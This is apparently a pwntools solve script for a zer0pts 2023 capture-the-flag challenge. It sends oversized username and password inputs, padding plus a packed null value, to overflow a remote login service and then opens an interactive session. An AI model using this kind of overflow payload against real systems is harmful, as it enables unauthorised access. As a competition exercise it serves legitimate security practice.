from pwn import *

io = remote('pwn.2023.zer0pts.com', 9006)
io.recvuntil(b'Username: ')
io.send(b'i'*416)
io.recvuntil(b'Password: ')
io.send(b'i'*344 + p64(0))
io.interactive()